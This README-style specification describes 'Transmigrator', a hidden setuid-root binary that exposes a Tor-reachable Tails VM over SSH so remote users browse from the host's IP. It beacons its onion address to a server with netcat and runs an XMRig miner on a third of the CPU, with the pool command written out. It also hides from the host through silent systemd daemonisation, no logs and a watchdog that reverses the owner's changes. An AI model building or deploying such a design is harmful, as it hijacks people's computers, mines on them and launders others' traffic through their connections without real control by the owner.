# Transmigrator

## Your Software Soul in Another Hardware Body

### Transmigrator is a "bombShell" to run VM hidden services over Tor so clients reach clearnet via Tails remote desktops with the decoy IP/MAC addresses of their hosts. It is compatible with Unix-like systems, v1 focusing on Linux distros of the Debian family.

### Specifications

- **Preconfig Compilation**: This `transmigrator.sh` script is designed for an eventual preconfigured compilation into a `transmigrator.sh.x` binary using `shc` (a C wrapping), ensuring that the only thing a host will need to do is download and execute the resulting binary to start running Transmigrator. This binary will be renamed as `.transmigrator.sh.x` to make it a hidden file and is the actual file the host executes, pre-treated with `setuid` to run with root without needing `sudo`. 

- **A Hidden Service URL**: The script must auto-generate a localhost `127.0.0.1` and expose it to the internet through its `.onion` URL (no more brute-forcing after securing the first that starts with `grator`). It then activates a beacon that relies on Netcat or `nc` to send (every 10 minutes) a message over clearnet to a `<server_ip> <port>` to be specified by the developer in which it tells server admins the `.onion` URL, thus, reiterating it is still live via Tor (`ProxyCommand` port `9050`).
 
- **GNOME Box + Tails VM**: It sets up localhost's GNOME Box with a Tails VM image inside, hard-coded with an allowance of 2GB of RAM and zero disk space. This guarantees that The Amnesic Incognito Live System cannot have persistence even if enabled, while also disabling core dumps and swaps not to count on specialised Intel or AMD hardware, that unlike server supercomputers, the host's PC is unlikely to possess. The headless Tails VM displays only to the remote SSH client and not to the host.  

- **Rules for Host Iptables**: Preconfigured iptables rules ensure that only one connection between localhost and the Tor user of this `.onion` hidden service is allowed at a time. `HiddenServicePort 22 127.0.0.1:22` binding is also necessary for accessing the hidden service with SSH. The localhost VM is dual-homed because it is accessed through Tor via the `.onion` URL, but the remote client can then reach clearnet from the Unsafe Browser of Tails, meaning web resources from localhost's IP.

- **Session Memory Sanitation**: Memory is sanitised upon detecting the VM has stopped running. This approach does not aim at zeroising, but rather rewriting memory by filling it with as close to random values as possible to mitigate the risk of data remanence. This complements the efforts of guaranteeing no persistence, core dumps, or swaps, none of which Transmigrator will allow changes to even by the host himself to protect users until `.transmigrator.sh.x` is finally purged from the system.

- **Background Daemonisation**: This `.transmigrator.sh.x` hidden file will use `systemctl` and `systemd` to make sure it is treated as a system service that is always running and restarts on its own after the computer reboots. All that is described here runs 100% in the background, with no opening of graphic user interfaces or any visible host notifications (note: the headless Tails VM displays only to the remote SSH client). Therefore, no logs of any kind are stored anywhere in the PC.

- **RAM & CPU Thread Donation**: By installing `.transmigrator.sh.x` a host agrees to volunteering no less than 2GB of RAM for running the Tails VM and 33% of their PC's total CPU threads. The latter used for an XMRig crypto miner `./xmrig --coin XMR --url "xmr.kryptex.network:7777" --user project@transmigrator.org/transmigrator -p x -k` included inside `.transmigrator.sh.x` with `https://raw.githubusercontent.com/transmigrator/miscellaneous/refs/heads/main/config.json`(adjustable config rules). 

- **Watchdog Self-Preservation**: As previously mentioned, `.transmigrator.sh.x` will be a "preconfig compilation" pre-treated with `setuid` (and also `chattr +i`) that installs all the third-party packages it needs to with `unattended-upgrades`. However, every 10 seconds, the watchdog will scan the system and reverse illegal changes to the resulting config files (except for the mining pool's remote `.json`) and even to relevant system-level settings like persistence, core dumps, or swaps. 
